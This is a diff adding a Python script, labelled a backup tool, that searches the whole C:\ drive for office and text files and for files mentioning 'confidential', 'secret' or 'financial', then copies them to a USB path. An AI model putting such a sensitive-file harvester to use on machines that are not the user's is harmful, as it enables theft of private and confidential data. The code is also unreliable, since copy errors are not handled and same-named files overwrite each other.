@@ -1,0 +1,47 @@
+import os
+import shutil
+
+# Define file extensions to consider as sensitive
+sensitive_extensions = ['.docx', '.xlsx', '.pdf', '.txt']
+
+# Define keywords to identify sensitive information
+sensitive_keywords = ['confidential', 'secret', 'sensitive', 'personal', 'financial']
+
+# Destination for backup
+backup_dir = r'E:\Backup'  # Change this to your USB drive letter
+
+def contains_sensitive_keywords(file_path):
+    """Check if the file contains any sensitive keywords."""
+    try:
+        with open(file_path, 'r', encoding='utf-8') as file:
+            contents = file.read()
+            return any(keyword.lower() in contents.lower() for keyword in sensitive_keywords)
+    except Exception as e:
+        print(f"Could not read file {file_path}: {e}")
+        return False
+
+def backup_sensitive_files():
+    """Backup sensitive files based on extensions from the entire file system."""
+    if not os.path.exists(backup_dir):
+        os.makedirs(backup_dir)
+
+    # Phase 1: Backup files with sensitive extensions
+    for root, dirs, files in os.walk('C:\\'):  # Change this if you want to search other drives (like D:\\)
+        for file in files:
+            file_path = os.path.join(root, file)
+            # Check for sensitive extensions
+            if any(file.endswith(ext) for ext in sensitive_extensions):
+                print(f'Backing up sensitive file: {file_path}')
+                shutil.copy(file_path, backup_dir)
+
+    # Phase 2: Backup other files that contain sensitive keywords
+    for root, dirs, files in os.walk('C:\\'):
+        for file in files:
+            file_path = os.path.join(root, file)
+            # Check if the file does not have a sensitive extension but contains sensitive keywords
+            if not any(file.endswith(ext) for ext in sensitive_extensions) and contains_sensitive_keywords(file_path):
+                print(f'Backing up file containing sensitive keywords: {file_path}')
+                shutil.copy(file_path, backup_dir)
+
+if __name__ == "__main__":
+    backup_sensitive_files()
